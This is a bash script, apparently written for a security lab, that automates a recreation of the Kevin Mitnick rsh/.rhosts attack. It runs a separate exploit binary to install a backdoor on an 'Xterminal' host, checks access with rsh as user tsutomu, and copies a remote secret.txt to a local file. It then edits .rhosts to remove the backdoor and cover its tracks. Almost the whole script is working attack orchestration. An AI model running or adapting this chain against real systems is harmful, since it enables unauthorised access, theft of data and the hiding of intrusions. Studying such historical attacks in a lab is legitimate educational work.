#!/bin/bash

#### GO.SH
## By DukeD1rtfarm3r
#
# This script runs the Kevin Mitnick attack. First, is uses bin/exploit to
# install a backdoor on the target machine. Then, using rsh, we steal the
# secret and then remove said backdoor as a way to cleanup.
#

# Read the input
if [ "$#" -ne "0" ] && [ "$#" -ne "1" ] && [ "$#" -ne "2" ] && [ "$#" -ne "5" ]; then
	echo "Usage: $0 [<exploit_path>[ <n_tries>[ <xterm-ip> <server-ip> <interface>]]]"
	exit -1
fi

exploit_path="bin/exploit"
tries="5"
xterm_ip="172.16.54.4"
server_ip="172.16.54.3"
interface="eth0"

if [ "$#" -ge "1" ]; then
    exploit_path=$1
    if [ "$#" -ge "2" ]; then
        tries=$2
        if [ "$#" -eq "5" ]; then
            xterm_ip=$3
            server_ip=$4
            interface=$5
        fi
    fi
fi



# Show an intro text
echo ""
echo "### GO.SH ###"
echo ""
echo "Options:"
echo " - Path to exploit : $exploit_path"
echo " - Number of tries : $tries"
echo " - Xterminal IPv4  : $xterm_ip"
echo " - Server IPv4     : $server_ip"
echo " - Interface       : $interface"
echo ""



# Make by calling make.sh
echo "0) Compiling exploit code..."
./make.sh
retval=$?
if [ "$retval" -ne "0" ]; then
    echo "Could not run make.sh (are you in the correct directory?)"
    echo ""
    exit $retval
fi
echo ""



# Then, run bin/exploit
echo "1) Attempting to install backdoor ($tries max tries)..."

for (( i=0; i<$tries; i++ ))
do
    # Run the exploit
    echo "   1.$(( 2*i ))) Running '\"./$exploit_path\" --xterm-ip \"$xterm_ip\" --server-ip \"$server_ip\" --device \"$interface\"'..."

    "./$exploit_path" --xterm-ip "$xterm_ip" --server-ip "$server_ip" --device "$interface"
    retval=$?

    if [ "$retval" -ne "0" ]; then
        echo "Running exploit returned code $retval, aborting..."
        echo ""
        exit $retval
    fi

    # Check if we were successful by checking rsh's return code
    echo "   2.$(( 2*i + 1 ))) Checking if backdoor was installed..."
    rsh -l tsutomu "$xterm_ip" "echo \"Hello there\""
    retval=$?

    if [ "$retval" -ne "0" ]; then
        if [ "$i" -eq "$(( tries-1 ))" ]; then
            echo "   Failed to run \"rsh -l tsutomu -i tsutomu \"$xterm_ip\" \"echo \\\"Hello there\\\"\", aborting..."
            echo ""
            echo "Failed to install backdoor in Xterminal."
            echo ""
            exit -1
        fi
        echo "   Failed to run \"rsh -l tsutomu -i tsutomu \"$xterm_ip\" \"echo \\\"Hello there\\\"\", retrying..."
        echo ""
    else
        echo "   Succes!"
        echo ""
        break
    fi
done



# Simply cat the secret.txt and write it to a local file
echo "3) Retrieving secret.txt..."

rsh -l tsutomu "$xterm_ip" "cat ./secret.txt" > ./secret.txt



# Finally, clean up by removing the backdoor
echo "4) Removing backdoor..."

rsh -l tsutomu "$xterm_ip" "grep -vwE \"+ +\" .rhosts > .rhosts2 && mv .rhosts2 .rhosts"
